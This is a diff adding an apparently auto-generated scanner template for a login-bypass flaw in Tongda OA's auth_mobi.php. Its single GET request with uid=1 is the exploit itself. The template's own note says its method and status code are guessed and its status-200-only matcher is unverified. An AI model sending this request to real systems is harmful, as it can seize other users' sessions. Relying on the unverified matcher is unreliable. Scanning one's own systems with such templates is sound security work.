@@ -1,0 +1,22 @@
+id: poc-20c3b3616f7f1b51113f
+info:
+  name: 通达OAauth_mobi.php在线用户登录漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/20c3b3616f7f1b51113f56af44f12008
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 20c3b3616f7f1b51113f56af44f12008
+http:
+- raw:
+  - 'GET /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
